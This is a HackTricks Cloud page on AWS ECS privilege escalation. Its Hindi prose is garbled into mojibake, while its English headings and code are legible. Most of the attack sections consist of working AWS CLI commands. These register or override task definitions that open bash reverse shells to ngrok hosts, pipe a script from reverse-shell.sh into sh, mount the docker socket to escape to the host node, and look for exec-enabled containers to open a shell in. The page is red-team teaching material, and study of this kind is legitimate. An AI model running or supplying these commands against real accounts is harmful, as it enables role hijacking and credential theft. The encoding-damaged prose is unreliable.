# AWS - ECS Privesc

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## ECS

ECS ‡§ï‡•á ‡§¨‡§æ‡§∞‡•á ‡§Æ‡•á‡§Ç ‡§Ö‡§ß‡§ø‡§ï **‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä**:

{% content-ref url="../aws-services/aws-ecs-enum.md" %}
[aws-ecs-enum.md](../aws-services/aws-ecs-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, `ecs:RegisterTaskDefinition`, `ecs:RunTask`

‡§è‡§ï ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ ‡§ú‡•ã `iam:PassRole`, `ecs:RegisterTaskDefinition` ‡§î‡§∞ `ecs:RunTask` ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§ï‡§æ ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§§‡§æ ‡§π‡•à, ‡§µ‡§π **‡§è‡§ï ‡§®‡§Ø‡§æ ‡§ü‡§æ‡§∏‡•ç‡§ï ‡§™‡§∞‡§ø‡§≠‡§æ‡§∑‡§æ** **‡§¨‡§®‡§æ‡§®‡•á** ‡§Æ‡•á‡§Ç ‡§∏‡§ï‡•ç‡§∑‡§Æ ‡§π‡•ã ‡§∏‡§ï‡§§‡§æ ‡§π‡•à ‡§ú‡§ø‡§∏‡§Æ‡•á‡§Ç ‡§è‡§ï **‡§¶‡•Å‡§∑‡•ç‡§ü ‡§ï‡§Ç‡§ü‡•á‡§®‡§∞** ‡§π‡•ã‡§§‡§æ ‡§π‡•à ‡§ú‡•ã ‡§Æ‡•á‡§ü‡§æ‡§°‡•á‡§ü‡§æ ‡§ï‡•ç‡§∞‡•á‡§°‡•á‡§Ç‡§∂‡§ø‡§Ø‡§≤‡•ç‡§∏ ‡§ï‡•ã ‡§ö‡•Å‡§∞‡§æ‡§§‡§æ ‡§π‡•à ‡§î‡§∞ **‡§á‡§∏‡•á ‡§ö‡§≤‡§æ‡§§‡§æ ‡§π‡•à**‡•§
```bash
# Generate task definition with rev shell
aws ecs register-task-definition --family iam_exfiltration \
--task-role-arn arn:aws:iam::947247140022:role/ecsTaskExecutionRole \
--network-mode "awsvpc" \
--cpu 256 --memory 512\
--requires-compatibilities "[\"FARGATE\"]" \
--container-definitions "[{\"name\":\"exfil_creds\",\"image\":\"python:latest\",\"entryPoint\":[\"sh\", \"-c\"],\"command\":[\"/bin/bash -c \\\"bash -i >& /dev/tcp/0.tcp.ngrok.io/14280 0>&1\\\"\"]}]"

# Run task definition
aws ecs run-task --task-definition iam_exfiltration \
--cluster arn:aws:ecs:eu-west-1:947247140022:cluster/API \
--launch-type FARGATE \
--network-configuration "{\"awsvpcConfiguration\":{\"assignPublicIp\": \"ENABLED\", \"subnets\":[\"subnet-e282f9b8\"]}}"

# Delete task definition
## You need to remove all the versions (:1 is enough if you just created one)
aws ecs deregister-task-definition --task-definition iam_exfiltration:1
```
**‡§∏‡§Ç‡§≠‡§æ‡§µ‡§ø‡§§ ‡§™‡•ç‡§∞‡§≠‡§æ‡§µ:** ‡§è‡§ï ‡§Ö‡§≤‡§ó ECS ‡§≠‡•Ç‡§Æ‡§ø‡§ï‡§æ ‡§Æ‡•á‡§Ç ‡§∏‡•Ä‡§ß‡•á ‡§™‡•ç‡§∞‡§ø‡§µ‡•á‡§∏‡•ç‡§ï‡•§

### `iam:PassRole`, `ecs:RegisterTaskDefinition`, `ecs:StartTask`

‡§™‡§ø‡§õ‡§≤‡•á ‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§ï‡•Ä ‡§§‡§∞‡§π, ‡§è‡§ï ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ **`iam:PassRole`, `ecs:RegisterTaskDefinition`, `ecs:StartTask`** ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø‡§Ø‡•ã‡§Ç ‡§ï‡§æ ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ECS ‡§Æ‡•á‡§Ç **‡§è‡§ï ‡§®‡§Ø‡§æ ‡§ï‡§æ‡§∞‡•ç‡§Ø ‡§™‡§∞‡§ø‡§≠‡§æ‡§∑‡§æ** ‡§â‡§§‡•ç‡§™‡§®‡•ç‡§® ‡§ï‡§∞ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à ‡§ú‡§ø‡§∏‡§Æ‡•á‡§Ç ‡§è‡§ï **‡§¶‡•Å‡§∑‡•ç‡§ü ‡§ï‡§Ç‡§ü‡•á‡§®‡§∞** ‡§π‡•ã‡§§‡§æ ‡§π‡•à ‡§ú‡•ã ‡§Æ‡•á‡§ü‡§æ‡§°‡•á‡§ü‡§æ ‡§ï‡•ç‡§∞‡•á‡§°‡•á‡§Ç‡§∂‡§ø‡§Ø‡§≤‡•ç‡§∏ ‡§ö‡•Å‡§∞‡§æ‡§§‡§æ ‡§π‡•à ‡§î‡§∞ **‡§á‡§∏‡•á ‡§ö‡§≤‡§æ‡§§‡§æ ‡§π‡•à**‡•§\
‡§π‡§æ‡§≤‡§æ‡§Ç‡§ï‡§ø, ‡§á‡§∏ ‡§Æ‡§æ‡§Æ‡§≤‡•á ‡§Æ‡•á‡§Ç, ‡§¶‡•Å‡§∑‡•ç‡§ü ‡§ï‡§æ‡§∞‡•ç‡§Ø ‡§™‡§∞‡§ø‡§≠‡§æ‡§∑‡§æ ‡§ï‡•ã ‡§ö‡§≤‡§æ‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§è‡§ï ‡§ï‡§Ç‡§ü‡•á‡§®‡§∞ ‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§π‡•ã‡§®‡§æ ‡§ö‡§æ‡§π‡§ø‡§è‡•§
```bash
# Generate task definition with rev shell
aws ecs register-task-definition --family iam_exfiltration \
--task-role-arn arn:aws:iam::947247140022:role/ecsTaskExecutionRole \
--network-mode "awsvpc" \
--cpu 256 --memory 512\
--container-definitions "[{\"name\":\"exfil_creds\",\"image\":\"python:latest\",\"entryPoint\":[\"sh\", \"-c\"],\"command\":[\"/bin/bash -c \\\"bash -i >& /dev/tcp/0.tcp.ngrok.io/14280 0>&1\\\"\"]}]"

aws ecs start-task --task-definition iam_exfiltration \
--container-instances <instance_id>

# Delete task definition
## You need to remove all the versions (:1 is enough if you just created one)
aws ecs deregister-task-definition --task-definition iam_exfiltration:1
```
**‡§∏‡§Ç‡§≠‡§æ‡§µ‡§ø‡§§ ‡§™‡•ç‡§∞‡§≠‡§æ‡§µ:** ‡§ï‡§ø‡§∏‡•Ä ‡§≠‡•Ä ECS ‡§≠‡•Ç‡§Æ‡§ø‡§ï‡§æ ‡§ï‡•á ‡§≤‡§ø‡§è ‡§∏‡•Ä‡§ß‡•á ‡§™‡•ç‡§∞‡§ø‡§µ‡•á‡§∏‡•ç‡§ï‡•§

### `iam:PassRole`, `ecs:RegisterTaskDefinition`, (`ecs:UpdateService|ecs:CreateService)`

‡§™‡§ø‡§õ‡§≤‡•á ‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§ï‡•Ä ‡§§‡§∞‡§π, ‡§è‡§ï ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ **`iam:PassRole`, `ecs:RegisterTaskDefinition`, `ecs:UpdateService`** ‡§Ø‡§æ **`ecs:CreateService`** ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø‡§Ø‡•ã‡§Ç ‡§ï‡§æ ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ECS ‡§Æ‡•á‡§Ç **‡§è‡§ï ‡§®‡§Ø‡§æ ‡§ï‡§æ‡§∞‡•ç‡§Ø ‡§™‡§∞‡§ø‡§≠‡§æ‡§∑‡§æ** ‡§â‡§§‡•ç‡§™‡§®‡•ç‡§® ‡§ï‡§∞ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à ‡§ú‡§ø‡§∏‡§Æ‡•á‡§Ç ‡§è‡§ï **‡§¶‡•Å‡§∑‡•ç‡§ü ‡§ï‡§Ç‡§ü‡•á‡§®‡§∞** ‡§π‡•ã‡§§‡§æ ‡§π‡•à ‡§ú‡•ã ‡§Æ‡•á‡§ü‡§æ‡§°‡•á‡§ü‡§æ ‡§ï‡•ç‡§∞‡•á‡§°‡•á‡§Ç‡§∂‡§ø‡§Ø‡§≤‡•ç‡§∏ ‡§ö‡•Å‡§∞‡§æ‡§§‡§æ ‡§π‡•à ‡§î‡§∞ **‡§á‡§∏‡•á ‡§ö‡§≤‡§æ‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ï‡§Æ ‡§∏‡•á ‡§ï‡§Æ 1 ‡§ï‡§æ‡§∞‡•ç‡§Ø ‡§ö‡§≤‡§æ‡§§‡•á ‡§π‡•Å‡§è ‡§è‡§ï ‡§®‡§à ‡§∏‡•á‡§µ‡§æ ‡§¨‡§®‡§æ‡§ï‡§∞‡•§**
```bash
# Generate task definition with rev shell
aws ecs register-task-definition --family iam_exfiltration \
--task-role-arn  "$ECS_ROLE_ARN" \
--network-mode "awsvpc" \
--cpu 256 --memory 512\
--requires-compatibilities "[\"FARGATE\"]" \
--container-definitions "[{\"name\":\"exfil_creds\",\"image\":\"python:latest\",\"entryPoint\":[\"sh\", \"-c\"],\"command\":[\"/bin/bash -c \\\"bash -i >& /dev/tcp/8.tcp.ngrok.io/12378 0>&1\\\"\"]}]"

# Run the task creating a service
aws ecs create-service --service-name exfiltration \
--task-definition iam_exfiltration \
--desired-count 1 \
--cluster "$CLUSTER_ARN" \
--launch-type FARGATE \
--network-configuration "{\"awsvpcConfiguration\":{\"assignPublicIp\": \"ENABLED\", \"subnets\":[\"$SUBNET\"]}}"

# Run the task updating a service
aws ecs update-service --cluster <CLUSTER NAME> \
--service <SERVICE NAME> \
--task-definition <NEW TASK DEFINITION NAME>
```
**‡§∏‡§Ç‡§≠‡§æ‡§µ‡§ø‡§§ ‡§™‡•ç‡§∞‡§≠‡§æ‡§µ:** ‡§ï‡§ø‡§∏‡•Ä ‡§≠‡•Ä ECS ‡§≠‡•Ç‡§Æ‡§ø‡§ï‡§æ ‡§ï‡•á ‡§≤‡§ø‡§è ‡§∏‡•Ä‡§ß‡•á ‡§™‡•ç‡§∞‡§ø‡§µ‡•á‡§∏‡•ç‡§ï‡•§

### `iam:PassRole`, (`ecs:UpdateService|ecs:CreateService)`

‡§µ‡§æ‡§∏‡•ç‡§§‡§µ ‡§Æ‡•á‡§Ç, ‡§ï‡•á‡§µ‡§≤ ‡§â‡§® ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø‡§Ø‡•ã‡§Ç ‡§ï‡•á ‡§∏‡§æ‡§•, ‡§Ø‡§π ‡§ì‡§µ‡§∞‡§∞‡§æ‡§á‡§°‡•ç‡§∏ ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§ï‡§ø‡§∏‡•Ä ‡§ï‡§Ç‡§ü‡•á‡§®‡§∞ ‡§Æ‡•á‡§Ç ‡§ï‡§ø‡§∏‡•Ä ‡§≠‡•Ä ‡§≠‡•Ç‡§Æ‡§ø‡§ï‡§æ ‡§ï‡•á ‡§∏‡§æ‡§• ‡§Æ‡§®‡§Æ‡§æ‡§®‡•á ‡§Ü‡§¶‡•á‡§∂ ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§ï‡§∞‡§®‡§æ ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•à ‡§ú‡•à‡§∏‡•á: 

{% code overflow="wrap" %}
```bash
aws ecs run-task \
--task-definition "<task-name>" \
--overrides '{"taskRoleArn":"<role-arn>", "containerOverrides":[{"name":"<container-name-in-task>","command":["/bin/bash","-c","curl https://reverse-shell.sh/6.tcp.eu.ngrok.io:18499 | sh"]}]}' \
--cluster <cluster-name> \
--network-configuration "{\"awsvpcConfiguration\":{\"assignPublicIp\": \"DISABLED\", \"subnets\":[\"<subnet-name>\"]}}"
```
{% endcode %}

**‡§∏‡§Ç‡§≠‡§æ‡§µ‡§ø‡§§ ‡§™‡•ç‡§∞‡§≠‡§æ‡§µ:** ‡§ï‡§ø‡§∏‡•Ä ‡§≠‡•Ä ECS ‡§≠‡•Ç‡§Æ‡§ø‡§ï‡§æ ‡§ï‡•á ‡§≤‡§ø‡§è ‡§∏‡•Ä‡§ß‡•á ‡§™‡•ç‡§∞‡§ø‡§µ‡•á‡§∏‡•ç‡§ï‡•§

### `ecs:RegisterTaskDefinition`, **`(ecs:RunTask|ecs:StartTask|ecs:UpdateService|ecs:CreateService)`**

‡§Ø‡§π ‡§™‡§∞‡§ø‡§¶‡•É‡§∂‡•ç‡§Ø ‡§™‡§ø‡§õ‡§≤‡•á ‡§µ‡§æ‡§≤‡•á ‡§ï‡•á ‡§∏‡§Æ‡§æ‡§® ‡§π‡•à ‡§≤‡•á‡§ï‡§ø‡§® **`iam:PassRole`** ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§ï‡•á **‡§¨‡§ø‡§®‡§æ**‡•§\
‡§Ø‡§π ‡§Ö‡§≠‡•Ä ‡§≠‡•Ä ‡§¶‡§ø‡§≤‡§ö‡§∏‡•ç‡§™ ‡§π‡•à ‡§ï‡•ç‡§Ø‡•ã‡§Ç‡§ï‡§ø ‡§Ø‡§¶‡§ø ‡§Ü‡§™ ‡§è‡§ï ‡§Æ‡§®‡§Æ‡§æ‡§®‡§æ ‡§ï‡§Ç‡§ü‡•á‡§®‡§∞ ‡§ö‡§≤‡§æ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç, ‡§≠‡§≤‡•á ‡§π‡•Ä ‡§Ø‡§π ‡§¨‡§ø‡§®‡§æ ‡§≠‡•Ç‡§Æ‡§ø‡§ï‡§æ ‡§ï‡•á ‡§π‡•ã, ‡§Ü‡§™ **‡§è‡§ï ‡§µ‡§ø‡§∂‡•á‡§∑‡§æ‡§ß‡§ø‡§ï‡§æ‡§∞ ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§Ç‡§ü‡•á‡§®‡§∞ ‡§ö‡§≤‡§æ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§§‡§æ‡§ï‡§ø** ‡§®‡•ã‡§° ‡§™‡§∞ **‡§≠‡§æ‡§ó ‡§ú‡§æ‡§è‡§Ç** ‡§î‡§∞ **EC2 IAM ‡§≠‡•Ç‡§Æ‡§ø‡§ï‡§æ** ‡§î‡§∞ **‡§Ö‡§®‡•ç‡§Ø ECS ‡§ï‡§Ç‡§ü‡•á‡§®‡§∞‡•ã‡§Ç ‡§ï‡•Ä ‡§≠‡•Ç‡§Æ‡§ø‡§ï‡§æ‡§è‡§Ç** ‡§ö‡•Å‡§∞‡§æ ‡§∏‡§ï‡•á‡§Ç ‡§ú‡•ã ‡§®‡•ã‡§° ‡§™‡§∞ ‡§ö‡§≤ ‡§∞‡§π‡•Ä ‡§π‡•à‡§Ç‡•§\
‡§Ü‡§™ ‡§Ø‡§π‡§æ‡§Ç ‡§§‡§ï ‡§ï‡§ø **‡§Ö‡§®‡•ç‡§Ø ‡§ï‡§æ‡§∞‡•ç‡§Ø‡•ã‡§Ç ‡§ï‡•ã EC2 ‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§ï‡•á ‡§Ö‡§Ç‡§¶‡§∞ ‡§ö‡§≤‡§æ‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§Æ‡§ú‡§¨‡•Ç‡§∞ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç** ‡§ú‡§ø‡§∏‡•á ‡§Ü‡§™ ‡§∏‡§Æ‡§ù‡•å‡§§‡§æ ‡§ï‡§∞‡§§‡•á ‡§π‡•à‡§Ç ‡§§‡§æ‡§ï‡§ø ‡§â‡§®‡§ï‡•Ä ‡§ï‡•ç‡§∞‡•á‡§°‡•á‡§Ç‡§∂‡§ø‡§Ø‡§≤‡•ç‡§∏ ‡§ö‡•Å‡§∞‡§æ ‡§∏‡§ï‡•á‡§Ç (‡§ú‡•à‡§∏‡§æ ‡§ï‡§ø [**‡§®‡•ã‡§° ‡§Ö‡§®‡•Å‡§≠‡§æ‡§ó ‡§Æ‡•á‡§Ç ‡§™‡•ç‡§∞‡§ø‡§µ‡•á‡§∏‡•ç‡§ï**](aws-ecs-privesc.md#privesc-to-node) ‡§Æ‡•á‡§Ç ‡§ö‡§∞‡•ç‡§ö‡§æ ‡§ï‡•Ä ‡§ó‡§à ‡§π‡•à)‡•§

{% hint style="warning" %}
‡§Ø‡§π ‡§π‡§Æ‡§≤‡§æ ‡§ï‡•á‡§µ‡§≤ ‡§§‡§≠‡•Ä ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•à ‡§ú‡§¨ **ECS ‡§ï‡•ç‡§≤‡§∏‡•ç‡§ü‡§∞ EC2** ‡§â‡§¶‡§æ‡§π‡§∞‡§£‡•ã‡§Ç ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞ ‡§∞‡§π‡§æ ‡§π‡•ã ‡§î‡§∞ Fargate ‡§ï‡§æ ‡§®‡§π‡•Ä‡§Ç‡•§
{% endhint %}
```bash
printf '[
{
"name":"exfil_creds",
"image":"python:latest",
"entryPoint":["sh", "-c"],
"command":["/bin/bash -c \\\"bash -i >& /dev/tcp/7.tcp.eu.ngrok.io/12976 0>&1\\\""],
"mountPoints": [
{
"readOnly": false,
"containerPath": "/var/run/docker.sock",
"sourceVolume": "docker-socket"
}
]
}
]' > /tmp/task.json

printf '[
{
"name": "docker-socket",
"host": {
"sourcePath": "/var/run/docker.sock"
}
}
]' > /tmp/volumes.json


aws ecs register-task-definition --family iam_exfiltration \
--cpu 256 --memory 512 \
--requires-compatibilities '["EC2"]' \
--container-definitions file:///tmp/task.json \
--volumes file:///tmp/volumes.json


aws ecs run-task --task-definition iam_exfiltration \
--cluster arn:aws:ecs:us-east-1:947247140022:cluster/ecs-takeover-ecs_takeover_cgidc6fgpq6rpg-cluster \
--launch-type EC2

# You will need to do 'apt update' and 'apt install docker.io' to install docker in the rev shell
```
### `ecs:ExecuteCommand`, `ecs:DescribeTasks,`**`(ecs:RunTask|ecs:StartTask|ecs:UpdateService|ecs:CreateService)`**

‡§è‡§ï ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ ‡§ï‡•á ‡§™‡§æ‡§∏ **`ecs:ExecuteCommand`, `ecs:DescribeTasks`** ‡§π‡•à ‡§ú‡§ø‡§∏‡§∏‡•á ‡§µ‡§π **‡§ï‡§Æ‡§æ‡§Ç‡§°‡•ç‡§∏** ‡§ï‡•ã ‡§è‡§ï ‡§ö‡§≤ ‡§∞‡§π‡•á ‡§ï‡§Ç‡§ü‡•á‡§®‡§∞ ‡§ï‡•á ‡§Ö‡§Ç‡§¶‡§∞ ‡§®‡§ø‡§∑‡•ç‡§™‡§æ‡§¶‡§ø‡§§ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à ‡§î‡§∞ ‡§á‡§∏‡§∏‡•á ‡§ú‡•Å‡§°‡§º‡•á IAM ‡§≠‡•Ç‡§Æ‡§ø‡§ï‡§æ ‡§ï‡•ã ‡§è‡§ï‡•ç‡§∏‡§´‡§ø‡§≤‡•ç‡§ü‡•ç‡§∞‡•á‡§ü ‡§ï‡§∞ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à (‡§Ü‡§™‡§ï‡•ã ‡§µ‡§ø‡§µ‡§∞‡§£ ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø‡§Ø‡•ã‡§Ç ‡§ï‡•Ä ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï‡§§‡§æ ‡§π‡•à ‡§ï‡•ç‡§Ø‡•ã‡§Ç‡§ï‡§ø `aws ecs execute-command` ‡§ö‡§≤‡§æ‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§Ø‡§π ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï ‡§π‡•à)‡•§\
‡§π‡§æ‡§≤‡§æ‡§Ç‡§ï‡§ø, ‡§ê‡§∏‡§æ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è, ‡§ï‡§Ç‡§ü‡•á‡§®‡§∞ ‡§á‡§Ç‡§∏‡•ç‡§ü‡•á‡§Ç‡§∏ ‡§ï‡•ã **ExecuteCommand ‡§è‡§ú‡•á‡§Ç‡§ü** ‡§ö‡§≤‡§æ ‡§∞‡§π‡§æ ‡§π‡•ã‡§®‡§æ ‡§ö‡§æ‡§π‡§ø‡§è (‡§ú‡•ã ‡§°‡§ø‡§´‡§º‡•â‡§≤‡•ç‡§ü ‡§∞‡•Ç‡§™ ‡§∏‡•á ‡§®‡§π‡•Ä‡§Ç ‡§π‡•ã‡§§‡§æ ‡§π‡•à)‡•§

‡§á‡§∏‡§≤‡§ø‡§è, ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ ‡§ï‡•ã‡§∂‡§ø‡§∂ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à:

* **‡§π‡§∞ ‡§ö‡§≤ ‡§∞‡§π‡•á ‡§ï‡§Ç‡§ü‡•á‡§®‡§∞ ‡§Æ‡•á‡§Ç ‡§è‡§ï ‡§ï‡§Æ‡§æ‡§Ç‡§° ‡§ö‡§≤‡§æ‡§®‡•á ‡§ï‡•Ä ‡§ï‡•ã‡§∂‡§ø‡§∂ ‡§ï‡§∞‡•á‡§Ç**
```bash
# List enableExecuteCommand on each task
for cluster in $(aws ecs list-clusters | jq .clusterArns | grep '"' | cut -d '"' -f2); do
echo "Cluster $cluster"
for task in $(aws ecs list-tasks --cluster "$cluster" | jq .taskArns | grep '"' | cut -d '"' -f2); do
echo "  Task $task"
# If true, it's your lucky day
aws ecs describe-tasks --cluster "$cluster" --tasks "$task" | grep enableExecuteCommand
done
done

# Execute a shell in a container
aws ecs execute-command --interactive \
--command "sh" \
--cluster "$CLUSTER_ARN" \
--task "$TASK_ARN"
```
* ‡§Ø‡§¶‡§ø ‡§â‡§∏‡§ï‡•á ‡§™‡§æ‡§∏ **`ecs:RunTask`** ‡§π‡•à, ‡§§‡•ã `aws ecs run-task --enable-execute-command [...]` ‡§ï‡•á ‡§∏‡§æ‡§• ‡§è‡§ï ‡§ï‡§æ‡§∞‡•ç‡§Ø ‡§ö‡§≤‡§æ‡§è‡§Å‡•§
* ‡§Ø‡§¶‡§ø ‡§â‡§∏‡§ï‡•á ‡§™‡§æ‡§∏ **`ecs:StartTask`** ‡§π‡•à, ‡§§‡•ã `aws ecs start-task --enable-execute-command [...]` ‡§ï‡•á ‡§∏‡§æ‡§• ‡§è‡§ï ‡§ï‡§æ‡§∞‡•ç‡§Ø ‡§ö‡§≤‡§æ‡§è‡§Å‡•§
* ‡§Ø‡§¶‡§ø ‡§â‡§∏‡§ï‡•á ‡§™‡§æ‡§∏ **`ecs:CreateService`** ‡§π‡•à, ‡§§‡•ã `aws ecs create-service --enable-execute-command [...]` ‡§ï‡•á ‡§∏‡§æ‡§• ‡§è‡§ï ‡§∏‡•á‡§µ‡§æ ‡§¨‡§®‡§æ‡§è‡§Å‡•§
* ‡§Ø‡§¶‡§ø ‡§â‡§∏‡§ï‡•á ‡§™‡§æ‡§∏ **`ecs:UpdateService`** ‡§π‡•à, ‡§§‡•ã `aws ecs update-service --enable-execute-command [...]` ‡§ï‡•á ‡§∏‡§æ‡§• ‡§è‡§ï ‡§∏‡•á‡§µ‡§æ ‡§Ö‡§™‡§°‡•á‡§ü ‡§ï‡§∞‡•á‡§Ç‡•§

‡§Ü‡§™ **‡§™‡§ø‡§õ‡§≤‡•á ECS privesc ‡§Ö‡§®‡•Å‡§≠‡§æ‡§ó‡•ã‡§Ç** ‡§Æ‡•á‡§Ç **‡§á‡§® ‡§µ‡§ø‡§ï‡§≤‡•ç‡§™‡•ã‡§Ç ‡§ï‡•á ‡§â‡§¶‡§æ‡§π‡§∞‡§£** ‡§™‡§æ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§

**‡§∏‡§Ç‡§≠‡§æ‡§µ‡§ø‡§§ ‡§™‡•ç‡§∞‡§≠‡§æ‡§µ:** ‡§ï‡§Ç‡§ü‡•á‡§®‡§∞‡•ã‡§Ç ‡§∏‡•á ‡§ú‡•Å‡§°‡§º‡•á ‡§è‡§ï ‡§Ö‡§≤‡§ó ‡§≠‡•Ç‡§Æ‡§ø‡§ï‡§æ ‡§Æ‡•á‡§Ç privesc‡•§

### `ssm:StartSession`

‡§¶‡•á‡§ñ‡•á‡§Ç ‡§ï‡§ø ‡§Ü‡§™ **ssm privesc ‡§™‡•É‡§∑‡•ç‡§†** ‡§Æ‡•á‡§Ç ‡§á‡§∏ ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§ï‡§æ ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó ‡§ï‡•à‡§∏‡•á ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§§‡§æ‡§ï‡§ø **ECS ‡§Æ‡•á‡§Ç privesc** ‡§π‡•ã ‡§∏‡§ï‡•á:

{% content-ref url="aws-ssm-privesc.md" %}
[aws-ssm-privesc.md](aws-ssm-privesc.md)
{% endcontent-ref %}

### `iam:PassRole`, `ec2:RunInstances`

‡§¶‡•á‡§ñ‡•á‡§Ç ‡§ï‡§ø ‡§Ü‡§™ **ec2 privesc ‡§™‡•É‡§∑‡•ç‡§†** ‡§Æ‡•á‡§Ç ‡§á‡§® ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø‡§Ø‡•ã‡§Ç ‡§ï‡§æ ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó ‡§ï‡•à‡§∏‡•á ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§§‡§æ‡§ï‡§ø **ECS ‡§Æ‡•á‡§Ç privesc** ‡§π‡•ã ‡§∏‡§ï‡•á:

{% content-ref url="aws-ec2-privesc.md" %}
[aws-ec2-privesc.md](aws-ec2-privesc.md)
{% endcontent-ref %}

### `?ecs:RegisterContainerInstance`

TODO: ‡§ï‡•ç‡§Ø‡§æ ‡§ï‡§ø‡§∏‡•Ä ‡§Ö‡§®‡•ç‡§Ø AWS ‡§ñ‡§æ‡§§‡•á ‡§∏‡•á ‡§è‡§ï ‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§™‡§Ç‡§ú‡•Ä‡§ï‡•É‡§§ ‡§ï‡§∞‡§®‡§æ ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•à ‡§§‡§æ‡§ï‡§ø ‡§ï‡§æ‡§∞‡•ç‡§Ø ‡§â‡§® ‡§Æ‡§∂‡•Ä‡§®‡•ã‡§Ç ‡§ï‡•á ‡§§‡§π‡§§ ‡§ö‡§≤‡§æ‡§è ‡§ú‡§æ‡§è‡§Ç ‡§ú‡•ã ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ ‡§®‡§ø‡§Ø‡§Ç‡§§‡•ç‡§∞‡§ø‡§§ ‡§π‡•à‡§Ç??

### `ecs:CreateTaskSet`, `ecs:UpdateServicePrimaryTaskSet`, `ecs:DescribeTaskSets`

{% hint style="info" %}
TODO: ‡§á‡§∏‡•á ‡§™‡§∞‡•Ä‡§ï‡•ç‡§∑‡§£ ‡§ï‡§∞‡•á‡§Ç
{% endhint %}

